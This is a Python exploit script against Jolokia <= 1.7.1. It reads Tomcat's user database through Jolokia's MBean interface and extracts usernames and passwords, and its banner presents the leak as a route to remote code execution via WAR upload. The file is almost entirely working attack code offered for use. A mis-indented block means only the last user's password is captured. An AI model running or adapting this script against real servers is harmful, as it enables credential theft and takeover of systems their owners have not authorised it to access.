import argparse
import json
import requests


# Name: banner
# Description: Display a banner to complete the
#              informations from parser.print_help().
# Return: void
def banner():
    message = """NAME: Jolokia <= 1.7.1, Information Leakage
DESCRIPTION: This script allows an attacker to achieve an Information Leakage (Tomcat's credentials)
    leading to Remote Code Execution via WAR upload.

The Remote Code Execution may be achieved manualy by using leaked Tomcat's credentials.
EXAMPLES:
    - Display help:
        $ python3 information_leakage_1.7.1.py -h
    - Use exploit via GET requests:
        $ python3 information_leakage_1.7.1.py --u http://127.0.0.1:8080/jolokia --m GET

AUTHOR: coiffeur
"""
    print(message)


# Name: extract
# Args: - raw: Data that will be parsed.
#       - start_delimiter: Delimiter before the expected data.
#       - end_delimiter: Delimiter after the expected data.
# Description: Extract data between two delimiters. If argument
#              raw contain bytes, arguments start_delimiter and
#              end_delimiter are expected to be bytes also.
# Return: bytes if argument raw is in bytes, string if argument
#         raw is a string.
def extract(raw, start_delimiter, end_delimiter):
    start = raw.find(start_delimiter)
    if start == -1:
        print("[*] Not found!")
        exit(-1)
    else:
        start = start + len(start_delimiter)
        end = start + raw[start::].find(end_delimiter)
        data = raw[start:end]
        if str(type(data)) == "<class 'bytes'>":
            print(f"[+] Found: {data.decode()}")
        else:
            print(f"[+] Found: {data}")
    return data


# The class Attack exploit a jolokia instance.
class Attack():
    base_url = None
    method = None

    def __init__(self, base_url, method):
        self.base_url = base_url
        self.method = method

    # Exploit an Information Leakage that could be used to
    # leverage a Remote Code Execution.
    def run(self):
        print("[*] Looking for Tomcat's credentials...")
        # Try to identify Tomcat's credentials via POST requests.
        if self.method == "POST":
            datas = {
                "type":"read",
                "mbean":"Users:database=UserDatabase,type=UserDatabase",
                "operation":"",
                "arguments":[]
            }
            r = requests.post(self.base_url, json=datas, verify=False)
        else:
            url = f"{self.base_url}/read/Users:database=UserDatabase,type=UserDatabase"
            r = requests.get(url, verify=False)
        result = json.loads(r.text)
        users = {}
        # Try to extract user(s) from JSON datas.
        try:
            if result["value"]["users"]:
                print(f"[+] User(s) found:\n{result['value']['users']}")
            print("[*] Parsing user(s) and looking for password...")
            for elt in result["value"]["users"]:
                users.update({extract(elt, "username=\"", "\""): ""})
        except Exception as e:
            pass
        # For each identified user, try to recover the associated password.
        for user in users:
            if self.method == "POST":
                datas = {
                    "type":"read",
                    "mbean":f"Users:database=UserDatabase,type=User,username=\"{user}\"",
                    "operation":"password",
                    "arguments":[]
                }
                r = requests.post(self.base_url, json=datas, verify=False)
            else:
                url = f"{self.base_url}/read/Users:database=UserDatabase,type=User,username=\"{user}\"/password"
                r = requests.get(url, verify=False)
            result = json.loads(r.text)
        try:
            if result["value"]:
                if self.method == "POST":
                    password = result["value"]["password"]
                else:
                    password = result["value"]
                print(f"[+] Password found: {password}")
                users.update({user: password})
        except Exception as e:
            pass
        if users != {}:
            print(f"[+] Exploit succeed:\n{users}")
        else:
            print("[x] Exploit failed!")
            exit(-1)


def main(options):
    if options["method"] not in ["GET", "POST"]:
        print("[!] Method not allowed!")
        exit(-1)
    atk = Attack(options["base_url"], options["method"])
    atk.run()
    exit(0)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--u", help="Jolokia's base URL (eg. http://127.0.0.1:8080/jolokia).")
    parser.add_argument("--m", help="HTTP methods (eg. GET or POST).")
    args = parser.parse_args()

    if (not args.u) or (not args.m):
        banner()
        parser.print_help()
        exit(-1)

    options = {}
    options["base_url"] = args.u
    options["method"] = args.m
    main(options)